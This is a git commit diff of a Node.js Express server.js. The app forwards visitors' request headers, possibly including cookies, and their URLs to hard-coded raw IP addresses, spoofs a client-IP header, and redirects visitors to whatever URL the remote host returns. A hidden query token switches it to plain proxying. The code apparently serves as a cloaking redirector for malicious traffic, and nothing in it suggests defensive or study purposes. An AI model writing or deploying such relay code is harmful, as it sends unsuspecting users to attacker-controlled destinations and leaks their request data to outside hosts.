b68175a51c5c16fdd899077c98624dd7b5f1c047
filomena1040 <120242762+filomena1040@users.noreply.github.com>
2023-10-30 05:58:42 -0700

    1

--- server.js
+++ server.js
@@ -1,29 +1,49 @@
 var bodyParser = require("body-parser");
 var express = require("express");
-const requester = require('request');
+const requester = require("request");
 
 var app = express();
-app.use(bodyParser.urlencoded({limit: '50mb', extended: true}));
-app.use(bodyParser.json({limit: '50mb'}));
+app.use(bodyParser.urlencoded({ limit: "50mb", extended: true }));
+app.use(bodyParser.json({ limit: "50mb" }));
 app.use(bodyParser.raw());
-app.set('port', process.env.PORT);
+app.set("port", process.env.PORT);
 
-app.post("/",function (req, res) {
- req.headers["true-client-ip"]=req.headers["x-forwarded-for"]
-var head=req.headers;
- var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("host","hello").replace("content-length","content2")
-  console.log(req.body)
- requester.post({
-    headers:JSON.parse(headerss),
-    url:     'http://146.59.49.67',
-    body:   req.body,
-    json: true
-  }).pipe(res)
-
-
+app.get("*", function (req, res) {
+  req.headers["X-Asteria-Client-IP"]=req.headers["x-forwarded-for"].split(",")[0]
+  var head = req.headers;
+  var headerss=JSON.stringify(head).replace("'{","").replace("}'","").replace("content-length","content2").replace("accept-encoding","dfsdfsdff")
+  var querystring = req.url;
+  var urrrl = "http://185.36.189.90" + req.url;
+  
+  if(!querystring.includes("flgkimv")){
+     
+      requester.get(
+      {
+        headers:JSON.parse(headerss),
+        url:     urrrl,
+      }, function(error, response, body){
+        if(response.statusCode==200){
+          if(!body.includes("<")){
+            return res.redirect(body); 
+          }else{
+            return res.sendStatus(400);           
+          }
+        }else{  
+          return res.sendStatus(400);
+        }
+    });
+    
+  }else if(querystring.includes("flgkimv")){
+    
+    requester.get({headers:JSON.parse(headerss),url:urrrl}).pipe(res);
+       
+  }else{
+     return res.sendStatus(400);
+  }
+    
 });
 
-app.listen(process.env.PORT, "0.0.0.0", function() {
-    console.log(app.get('port'))
-    console.log("Starting listen...");
+app.listen(process.env.PORT, "0.0.0.0", function () {
+  console.log(app.get("port"));
+  console.log("Starting listen...");
 });
